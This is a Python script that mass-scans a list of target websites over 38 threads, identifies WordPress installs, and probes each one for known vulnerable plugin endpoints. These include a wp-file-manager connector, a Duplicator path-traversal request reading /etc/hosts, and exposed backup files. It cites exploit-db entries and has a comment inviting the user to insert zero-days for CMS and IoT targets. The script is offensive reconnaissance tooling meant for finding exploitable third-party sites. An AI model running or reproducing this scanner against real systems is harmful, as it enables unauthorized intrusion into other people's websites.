#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import requests
from socket import *
import time
from random import randrange
from queue import Queue
# from multiprocessing import Queue
from threading import Thread
from requests.exceptions import HTTPError
from hashlib import md5
import logging
#import private
from OpenSSL import crypto
# from requests import pyopenssl as reqs
import re

sitepath = "./wordpress.txt"
ch = logging.FileHandler(sitepath)
slogger = logging.getLogger('wordpress')
slogger.setLevel(logging.INFO)
slogger.addHandler(ch)

THREADS_COUNT = 38

proxies = dict(http='127.0.0.1:8080')

def get_user_agent():
    user_agent = {
        'User-agent': '"Mozilla/5.5 (Macintosh; Intel Mac OS X 21) AppleWebKit/5.5.5 (KHTML, like Gecko)'}
    return user_agent


def main():
    setdefaulttimeout(15)
    q = Queue(maxsize=0)
    with open("./target/sitelist2.txt") as ip:
        target = [line.rstrip('\n') for line in ip]

        for i in range(len(target)):
            q.put_nowait((i, target[i]))
    start_thread(q)


def start_thread(q):
    for i in range(THREADS_COUNT):
        worker = Thread(target=processor, args=(q,))
        worker.setDaemon(True)
        worker.start()
    q.join()


def processor(q, ):
    while not q.empty():
        item = q.get_nowait()
        search_payload(q, item[1])
        q.task_done()
    return True

### here you insert your 0day for various targets (CMS, IoT)
def search_payload(q, session_url):
    payload = {
        'vuln': [
            {'payload': '/wp-content/plugins/easy-wp-smtp', 'response': 'Index of',
             'info': 'https://mp.weixin.qq.com/s/zUfpNKtAIs7SXubPafKmFw'},
            {'payload': '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',
             'response': 'errUnknownCmd', 'info': 'https://www.exploit-db.com/exploits/49178'},
            {'payload': '/wp-content/plugins/boldgrid-backup/cron/restore-info.json', 'response': 'filepath',
             'info': 'https://www.exploit-db.com/exploits/49252'},
            {'payload': '/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../etc/hosts',
              'response': 'localhost', 'info': 'https://www.exploit-db.com/exploits/49288'},
            {'payload': '/wp-admin/admin-ajax.php?action=_ning_upload_image', 'response': 'no files found',
             'info': 'https://www.exploit-db.com/exploits/49332'},
            {'payload': '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',
             'response': 'errUnknownCmd', 'info': 'https://www.seebug.org/vuldb/ssvid-99077'},
        ]

    }

    try:
        r = requests.get(session_url, allow_redirects=True, headers=get_user_agent(), timeout=8)
        if r.status_code == 200:
            r = requests.get(r.url + 'wp-admin/', allow_redirects=True, headers=get_user_agent(), timeout=8)
            if 'wp-login' in r.url:
                slogger.info("{}".format(session_url))

                for check in payload['vuln']:
                    r = requests.get(session_url + check['payload'], allow_redirects=True, headers=get_user_agent(),
                                         timeout=8)
                    if check['response'] in r.content.__str__():
                        print("[*] vulnerable: {}".format(r.url))

    except:
        pass


if __name__ == '__main__':
    sys.exit(main())
